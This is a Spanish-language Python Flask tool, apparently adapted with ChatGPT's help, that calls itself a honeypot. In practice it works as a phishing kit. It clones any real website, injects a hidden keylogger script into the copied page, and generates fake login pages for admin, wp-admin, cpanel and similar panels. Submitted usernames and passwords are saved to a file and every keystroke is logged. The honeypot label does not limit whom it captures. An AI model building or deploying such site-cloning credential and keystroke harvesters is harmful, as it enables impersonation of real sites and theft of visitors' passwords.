#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Queso Honeypot Mexicano - Versión simplificada y con menú funcional (mexicanizado).
Autor: Héctor (adaptado por ChatGPT)
"""

import os
import sys
import json
import threading
import time
from collections import defaultdict, Counter
from urllib.parse import urlparse, urljoin
import requests
from flask import Flask, request, render_template_string, jsonify, has_request_context
from datetime import datetime, timedelta
import re
from werkzeug.serving import make_server

# ---------------------------
# Banner ASCII QUESO
# ---------------------------
BANNER = """
 ██████╗ ██╗   ██╗███████╗███████╗ ██████╗ 
██╔═══██╗██║   ██║██╔════╝██╔════╝██╔═══██╗
██║   ██║██║   ██║█████╗  ███████╗██║   ██║
██║▄▄ ██║██║   ██║██╔══╝  ╚════██║██║   ██║
╚██████╔╝╚██████╔╝███████╗███████║╚██████╔╝
 ╚══▀▀═╝  ╚═════╝ ╚══════╝╚═════╝ ╚═════╝ 
                                           
🧀 HONEYPOT MEXICANO AVANZADO v2.0 🧀
¡El mejor queso para atrapar ratones!
"""

# ---------------------------
# Configuración y paths
# ---------------------------
app = Flask(__name__)
CLONE_DIR = "sitio_clonado"
LOG_FILE = "honeypot_carnitas.log"
CONFIG_FILE = "config_honeypot.json"
BLOCKED_IPS_FILE = "ips_bloqueadas.json"
ASSETS_DIR = os.path.join(CLONE_DIR, "recursos")
CAPTURED_DATA_FILE = "datos_capturados.log"

# Config default
CONFIG_PREDETERMINADA = {
    "max_peticiones_por_minuto": 60,
    "umbral_bloqueo_automatico": 10,
    "nivel_log": "INFO",
    "capturar_pantallazos": False,
    "panel_admin_falso": True,
    "trampas_honeypot": True,
    "logging_avanzado": True,
    "puertos_activos": [8080],
    "niveles_profundidad": 3,
    "crear_subdirectorios": True,
    "modo_stealth": False,
    "capturar_cookies": True,
    "simular_vulnerabilidades": True
}

# ---------------------------
# Utilidades de archivos y config
# ---------------------------
def cargar_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        # merge safe
        merged = {**CONFIG_PREDETERMINADA, **cfg}
        return merged
    except FileNotFoundError:
        guardar_config(CONFIG_PREDETERMINADA)
        return CONFIG_PREDETERMINADA.copy()
    except Exception as e:
        print(f"[!] Error cargando config: {e}")
        return CONFIG_PREDETERMINADA.copy()

def guardar_config(config):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[!] Error guardando config: {e}")

def cargar_ips_bloqueadas():
    try:
        with open(BLOCKED_IPS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return set(data) if isinstance(data, (list, tuple)) else set()
    except FileNotFoundError:
        return set()
    except Exception as e:
        print(f"[!] Error cargando IPs bloqueadas: {e}")
        return set()

def guardar_ips_bloqueadas(ips_bloqueadas):
    try:
        with open(BLOCKED_IPS_FILE, "w", encoding="utf-8") as f:
            json.dump(list(ips_bloqueadas), f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[!] Error guardando IPs bloqueadas: {e}")

def inicializar_archivos():
    archivos = [LOG_FILE, CAPTURED_DATA_FILE]
    directorios = [CLONE_DIR, ASSETS_DIR]
    for archivo in archivos:
        if not os.path.exists(archivo):
            with open(archivo, "w", encoding="utf-8") as f:
                f.write("")
            print(f"[+] Archivo creado: {archivo}")
    for directorio in directorios:
        os.makedirs(directorio, exist_ok=True)

# ---------------------------
# Contenedores y globals
# ---------------------------
request_counts = defaultdict(list)
blocked_ips = cargar_ips_bloqueadas()
config = cargar_config()

# ---------------------------
# Logging mejorado
# ---------------------------
def advanced_log_data(data, log_type="INFO"):
    timestamp = datetime.now().isoformat()
    if has_request_context():
        try:
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            user_agent = request.headers.get('User-Agent', 'Unknown')
            referer = request.headers.get('Referer', 'Direct')
        except Exception:
            ip = "UNKNOWN"
            user_agent = "Unknown"
            referer = "Direct"
    else:
        ip = "SYSTEM"
        user_agent = "SYSTEM"
        referer = "SYSTEM"

    log_entry = {
        "timestamp": timestamp,
        "type": log_type,
        "ip": ip,
        "user_agent": user_agent,
        "referer": referer,
        "data": data
    }
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as log:
            if config.get("logging_avanzado", True):
                log.write(f"{json.dumps(log_entry, ensure_ascii=False)}\n")
            else:
                log.write(f"{timestamp} - {data} - IP: {ip}\n")
    except Exception as e:
        print(f"[!] Error al escribir log: {e}", file=sys.stderr)

# ---------------------------
# Rate limiting / bloqueo
# ---------------------------
def is_ip_blocked(ip):
    return ip in blocked_ips

def rate_limit_check(ip):
    now = datetime.now()
    minute_ago = now - timedelta(minutes=1)
    request_counts[ip] = [t for t in request_counts[ip] if t > minute_ago]
    request_counts[ip].append(now)
    if len(request_counts[ip]) > config.get("max_peticiones_por_minuto", 60):
        blocked_ips.add(ip)
        guardar_ips_bloqueadas(blocked_ips)
        return False
    return True

# ---------------------------
# Funciones para crear estructura / generar contenido falso
# ---------------------------
def generar_contenido_falso(directorio, archivo, url_base):
    if archivo.endswith('.html'):
        return f"""<!DOCTYPE html>
<html lang="es">
<head>
    <title>{directorio.title()} - {urlparse(url_base).netloc}</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; padding:40px; background:#f6f8fa; }}
        .container {{ max-width:420px; margin:0 auto; background:white; padding:24px; border-radius:8px; box-shadow:0 8px 24px rgba(0,0,0,0.08); }}
        input, button {{ width:100%; padding:12px; margin-top:8px; border-radius:6px; border:1px solid #ddd; box-sizing:border-box; }}
        button {{ background:#2b7cff; color:white; border:none; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 {directorio.title()}</h2>
        <p>Acceso seguro — {urlparse(url_base).netloc}</p>
        <form method="POST" action="/capturar_credenciales">
            <input type="hidden" name="origen" value="{directorio}/{archivo}">
            <input type="text" name="usuario" placeholder="Usuario" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <input type="hidden" name="honeypot_trap">
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
    <script>
        document.addEventListener('keydown', function(e) {{
            fetch('/log_teclas', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ tecla: e.key, pagina: '{directorio}/{archivo}', timestamp: new Date().toISOString() }})
            }});
        }});
    </script>
</body>
</html>"""
    elif archivo.endswith('.php'):
        return f"""<?php
// Archivo falso {directorio}/{archivo}
if ($_POST) {{
    $data = json_encode($_POST);
    file_put_contents('{CAPTURED_DATA_FILE}', date('Y-m-d H:i:s') . " - " . $data . "\\n", FILE_APPEND);
}}
header('Location: /');
exit();
?>"""
    elif archivo == 'robots.txt':
        return f"User-agent: *\nDisallow: /admin/\nSitemap: {url_base}/sitemap.xml\n"
    elif archivo == '.htaccess':
        return "RewriteEngine On\nRewriteRule ^(.*)$ index.php [QSA,L]\n"
    else:
        return f"# Archivo falso: {directorio}/{archivo}\n"

def crear_estructura_completa(url_base):
    directorios_comunes = [
        "admin", "wp-admin", "login", "panel", "phpmyadmin", "cpanel",
        "uploads", "images", "css", "js", "api", "user", "dashboard"
    ]
    archivos_comunes = ["index.html", "login.html", "config.php", "robots.txt", ".htaccess"]
    for d in directorios_comunes:
        os.makedirs(os.path.join(CLONE_DIR, d), exist_ok=True)
        for a in ["index.html", "login.php"]:
            with open(os.path.join(CLONE_DIR, d, a), "w", encoding="utf-8") as f:
                f.write(generar_contenido_falso(d, a, url_base))
    for a in archivos_comunes:
        with open(os.path.join(CLONE_DIR, a), "w", encoding="utf-8") as f:
            f.write(generar_contenido_falso("root", a, url_base))
    advanced_log_data(f"Estructura creada para {url_base}", "SYSTEM")

# ---------------------------
# Clonar sitio (simple)
# ---------------------------
def clone_site(url):
    try:
        os.makedirs(CLONE_DIR, exist_ok=True)
        os.makedirs(ASSETS_DIR, exist_ok=True)
        advanced_log_data({"action": "clone_start", "url": url}, "SYSTEM")
        print(f"[+] Orale, clonando {url} ...")
        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        html = r.text
        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

        css_links = re.findall(r'<link[^>]*href=["\']([^"\']*\.css)["\']', html)
        js_links = re.findall(r'<script[^>]*src=["\']([^"\']*\.js)["\']', html)

        for css in css_links:
            try:
                css_url = urljoin(base_url, css)
                res = requests.get(css_url, timeout=5)
                name = os.path.basename(css) or "style.css"
                with open(os.path.join(ASSETS_DIR, name), "w", encoding="utf-8") as f:
                    f.write(res.text)
                html = html.replace(css, f"/assets/{name}")
            except Exception:
                continue
        for js in js_links:
            try:
                js_url = urljoin(base_url, js)
                res = requests.get(js_url, timeout=5)
                name = os.path.basename(js) or "script.js"
                with open(os.path.join(ASSETS_DIR, name), "w", encoding="utf-8") as f:
                    f.write(res.text)
                html = html.replace(js, f"/assets/{name}")
            except Exception:
                continue

        # insertar trampas si están activadas
        if config.get("trampas_honeypot", True):
            trap_html = """
            <div style="display:none;">
                <a href="/admin">Panel admin</a>
                <a href="/wp-admin">wp-admin</a>
            </div>
            <script>
                document.addEventListener('keydown', function(e) {
                    fetch('/log_keypress', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({key: e.key, timestamp: new Date().toISOString()})});
                });
            </script>
            """
            html = html.replace("</body>", trap_html + "</body>")

        with open(os.path.join(CLONE_DIR, "index.html"), "w", encoding="utf-8") as f:
            f.write(html)
        advanced_log_data({"action": "clone_done", "url": url}, "SYSTEM")
        print(f"[+] Clonación completada en {CLONE_DIR}/index.html")
        return True
    except Exception as e:
        advanced_log_data({"action": "clone_error", "error": str(e)}, "ERROR")
        print(f"[!] Error clonando sitio: {e}")
        return False

# ---------------------------
# Endpoints básicos del honeypot
# ---------------------------
@app.before_request
def antes_de_request():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if is_ip_blocked(ip):
        advanced_log_data(f"Acceso bloqueado: {ip}", "BLOCKED")
        return "Acceso denegado", 403
    if not rate_limit_check(ip):
        advanced_log_data(f"Rate limit excedido: {ip}", "RATE_LIMIT")
        return "Demasiadas solicitudes", 429

@app.route("/assets/<path:filename>")
def serve_assets(filename):
    try:
        with open(os.path.join(ASSETS_DIR, filename), "r", encoding="utf-8") as f:
            content = f.read()
        if filename.endswith(".css"):
            return content, 200, {'Content-Type': 'text/css'}
        if filename.endswith(".js"):
            return content, 200, {'Content-Type': 'application/javascript'}
        return content
    except Exception:
        return "Not found", 404

@app.route("/capturar_credenciales", methods=["POST"])
def capturar_credenciales():
    data = request.form.to_dict()
    origen = data.pop("origen", "unknown")
    advanced_log_data(data, "CREDENTIALS")
    with open(CAPTURED_DATA_FILE, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now().isoformat()} - {json.dumps(data, ensure_ascii=False)}\n")
    return render_template_string("""
        <html><body><h2>¡Gracias!</h2><p>Te redirigimos al inicio.</p><a href="/">Volver</a></body></html>
    """)

@app.route("/log_teclas", methods=["POST"])
def log_teclas():
    data = request.get_json() or {}
    advanced_log_data(data, "KEYLOGGER")
    return jsonify({"ok": True})

@app.route("/trampa_datos", methods=["POST"])
def trampa_datos():
    data = request.form.to_dict()
    advanced_log_data(data, "TRAP")
    return jsonify({"ok": True})

@app.route("/captured_data")
def captured_data():
    try:
        with open(CAPTURED_DATA_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
        return jsonify({"captured": lines})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/stats")
def stats_route():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
        total = len(lines)
        ips = []
        for l in lines:
            try:
                j = json.loads(l)
                ips.append(j.get("ip", "Unknown"))
            except Exception:
                if " - IP: " in l:
                    parts = l.split(" - IP: ")
                    ips.append(parts[1].strip())
        return jsonify({"total_entries": total, "unique_ips": len(set(ips)), "blocked": list(blocked_ips)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/analysis")
def analysis_route():
    return jsonify(analyze_logs())

@app.route("/admin_panel")
def admin_panel():
    return render_template_string("""
        <html><body>
        <h1>Panel de Administración (falso)</h1>
        <p>Usa los endpoints /stats, /analysis, /captured_data</p>
        </body></html>
    """)

# ---------------------------
# Análisis de logs
# ---------------------------
def analyze_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
    except Exception:
        lines = []
    ip_count = Counter()
    user_agents = Counter()
    attack_patterns = Counter()
    hourly_activity = defaultdict(int)
    for l in lines:
        try:
            j = json.loads(l)
            ip = j.get("ip", "Unknown")
            ua = j.get("user_agent", "Unknown")
            ts = datetime.fromisoformat(j.get("timestamp"))
        except Exception:
            ip = "Unknown"
            ua = "Unknown"
            ts = datetime.now()
        ip_count[ip] += 1
        user_agents[ua] += 1
        hourly_activity[ts.hour] += 1
        low = l.lower()
        if any(k in low for k in ("sql", "admin", "login", "password", "phpmyadmin")):
            attack_patterns["potential_attack"] += 1
    most_active = ip_count.most_common(1)
    most_ip = most_active[0][0] if most_active else None
    most_count = most_active[0][1] if most_active else 0
    return {
        "total_entries": len(lines),
        "unique_ips": len(ip_count),
        "most_active_ip": most_ip,
        "most_active_ip_count": most_count,
        "top_user_agents": user_agents.most_common(5),
        "attack_patterns": dict(attack_patterns),
        "hourly_activity": dict(hourly_activity),
        "blocked_ips_count": len(blocked_ips)
    }

# ---------------------------
# Clonar helpers y logging simple
# ---------------------------
def log_data(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now().isoformat()} - {data}\n")
    except Exception:
        pass

# ---------------------------
# Server thread (start/stop desde menú)
# ---------------------------
class ServerThread(threading.Thread):
    def __init__(self, app, host='0.0.0.0', port=8080):
        threading.Thread.__init__(self)
        self.server = make_server(host, port, app)
        self.ctx = app.app_context()
        self.host = host
        self.port = port
        self.ctx.push()
        self._running = False

    def run(self):
        self._running = True
        print(f"[+] Servidor arrancando en http://{self.host}:{self.port} (presiona 2 para detener desde el menú)")
        try:
            self.server.serve_forever()
        except Exception as e:
            print(f"[!] Error en server: {e}")
        finally:
            self._running = False

    def shutdown(self):
        try:
            self.server.shutdown()
            self._running = False
        except Exception as e:
            print(f"[!] Error deteniendo server: {e}")

    @property
    def running(self):
        return self._running

# ---------------------------
# Menú interactivo (mexicanizado)
# ---------------------------
def mostrar_menu():
    print("\n" + "="*60)
    print("🧀 MENÚ - QUESO HONEYPOT MEXICANO (versión simplificada)")
    print("="*60)
    print("1) 🕷️  Clonar sitio web")
    print("2) 🚀 Iniciar / Detener honeypot (servidor web)")
    print("3) 📊 Ver estadísticas rápidas")
    print("4) 📋 Analizar logs detallados")
    print("5) 🚫 Gestionar IPs bloqueadas")
    print("6) ⚙️  Configuración rápida")
    print("7) 🧹 Limpiar logs")
    print("8) 📤 Exportar datos (JSON)")
    print("9) 🔧 Configurar puertos activos")
    print("10) 🎯 Ver datos capturados (últimas líneas)")
    print("11) 🔍 Buscar en logs")
    print("12) 📱 URL del panel web (admin falso)")
    print("0) 🚪 Salir")
    print("="*60)

def main_menu():
    server_thread = None
    while True:
        mostrar_menu()
        choice = input("¿Qué quieres hacer? (elige número) » ").strip()
        if choice == "1":
            url = input("Pon la URL a clonar (ej. https://example.com): ").strip()
            if url:
                clone_site(url)
            else:
                print("[!] URL inválida, órale intenta otra vez.")
            input("Presiona ENTER para continuar...")
        elif choice == "2":
            if server_thread and server_thread.running:
                print("[*] Deteniendo el honeypot...")
                server_thread.shutdown()
                server_thread.join(timeout=5)
                server_thread = None
                print("[OK] Honeypot detenido.")
            else:
                puerto = input(f"Puerto para el servidor [{config.get('puertos_activos',[8080])[0]}]: ").strip()
                try:
                    puerto = int(puerto) if puerto else int(config.get('puertos_activos',[8080])[0])
                except Exception:
                    puerto = int(config.get('puertos_activos',[8080])[0])
                server_thread = ServerThread(app, host='0.0.0.0', port=puerto)
                server_thread.daemon = True
                server_thread.start()
                time.sleep(0.5)
            input("Presiona ENTER para continuar...")
        elif choice == "3":
            stats = analyze_logs()
            print("\n--- Estadísticas rápidas ---")
            print(f"Entradas totales: {stats.get('total_entries')}")
            print(f"IPs únicas: {stats.get('unique_ips')}")
            print(f"IP más activa: {stats.get('most_active_ip')} ({stats.get('most_active_ip_count')})")
            print(f"IPs bloqueadas: {len(blocked_ips)}")
            input("\nENTER para seguir...")
        elif choice == "4":
            data = analyze_logs()
            print("\n--- Análisis detallado ---")
            print(json.dumps(data, indent=2, ensure_ascii=False))
            input("\nENTER para seguir...")
        elif choice == "5":
            print("\nGestión de IPs bloqueadas:")
            print("a) Listar")
            print("b) Bloquear IP")
            print("c) Desbloquear IP")
            sub = input("Elige a/b/c » ").strip().lower()
            if sub == "a":
                print(json.dumps(list(blocked_ips), ensure_ascii=False, indent=2))
            elif sub == "b":
                ip = input("IP a bloquear: ").strip()
                if ip:
                    blocked_ips.add(ip)
                    guardar_ips_bloqueadas(blocked_ips)
                    advanced_log_data({"action": "manual_block", "ip": ip}, "ADMIN")
                    print(f"[OK] IP {ip} bloqueada.")
            elif sub == "c":
                ip = input("IP a desbloquear: ").strip()
                if ip:
                    blocked_ips.discard(ip)
                    guardar_ips_bloqueadas(blocked_ips)
                    advanced_log_data({"action": "manual_unblock", "ip": ip}, "ADMIN")
                    print(f"[OK] IP {ip} desbloqueada.")
            input("ENTER para seguir...")
        elif choice == "6":
            print("\nConfiguración rápida:")
            print(json.dumps(config, indent=2, ensure_ascii=False))
            if input("¿Quieres editar max_peticiones_por_minuto? (s/N) » ").strip().lower() == "s":
                val = input("Nuevo valor (número) » ").strip()
                try:
                    config["max_peticiones_por_minuto"] = int(val)
                    guardar_config(config)
                    print("[OK] Guardado.")
                except Exception:
                    print("[!] Valor inválido.")
            input("ENTER para seguir...")
        elif choice == "7":
            open(LOG_FILE, "w").close()
            advanced_log_data("Logs limpiados manualmente", "ADMIN")
            print("[OK] Logs limpiados.")
            input("ENTER para seguir...")
        elif choice == "8":
            try:
                raw = []
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    raw = f.readlines()
                export = {
                    "export_timestamp": datetime.now().isoformat(),
                    "analysis": analyze_logs(),
                    "raw_logs": raw,
                    "blocked_ips": list(blocked_ips),
                    "config": config
                }
                fname = f"export_honeypot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(fname, "w", encoding="utf-8") as ef:
                    json.dump(export, ef, indent=2, ensure_ascii=False)
                print(f"[OK] Exportado a {fname}")
            except Exception as e:
                print(f"[!] Error exportando: {e}")
            input("ENTER para seguir...")
        elif choice == "9":
            puertos = input("Introduce puertos activos separados por comas (ej. 8080,9000) » ").strip()
            if puertos:
                try:
                    arr = [int(x.strip()) for x in puertos.split(",") if x.strip()]
                    config["puertos_activos"] = arr
                    guardar_config(config)
                    print("[OK] Puertos actualizados.")
                except Exception:
                    print("[!] Error al parsear puertos.")
            input("ENTER para seguir...")
        elif choice == "10":
            try:
                with open(CAPTURED_DATA_FILE, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                n = input("Cuántas líneas mostrar (default 20) » ").strip()
                try:
                    n = int(n) if n else 20
                except Exception:
                    n = 20
                tail = lines[-n:]
                print("".join(tail) if tail else "[vacío]")
            except Exception as e:
                print(f"[!] Error leyendo captured data: {e}")
            input("ENTER para seguir...")
        elif choice == "11":
            q = input("Consulta a buscar en logs » ").strip()
            if q:
                try:
                    with open(LOG_FILE, "r", encoding="utf-8") as f:
                        lines = f.readlines()
                    res = [l for l in lines if q.lower() in l.lower()]
                    print(f"[+] {len(res)} resultados encontrados:")
                    for r in res[-50:]:
                        print(r.strip())
                except Exception as e:
                    print(f"[!] Error buscando: {e}")
            input("ENTER para seguir...")
        elif choice == "12":
            puerto_default = config.get("puertos_activos", [8080])[0]
            print(f"Panel admin (falso): http://127.0.0.1:{puerto_default}/admin_panel")
            if not any(threading.enumerate()) or not any(isinstance(t, ServerThread) and t.running for t in threading.enumerate()):
                print("[!] Oye, el servidor no parece estar corriendo. Inicia con opción 2 primero.")
            input("ENTER para seguir...")
        elif choice == "0":
            print("Sale pues — cerrando todo.")
            # Detener servidor si está corriendo
            for t in threading.enumerate():
                if isinstance(t, ServerThread) and t.running:
                    t.shutdown()
                    t.join(timeout=3)
            print("Nos vemos, Héctor.")
            sys.exit(0)
        else:
            print("[!] Opción no válida, intenta otra vez.")
            time.sleep(0.3)

# ---------------------------
# MAIN
# ---------------------------
if __name__ == "__main__":
    print(BANNER)
    inicializar_archivos()
    # asegurar config actualizada
    config = cargar_config()
    blocked_ips = cargar_ips_bloqueadas()
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n[!] Interrupción, saliendo...")
        sys.exit(0)
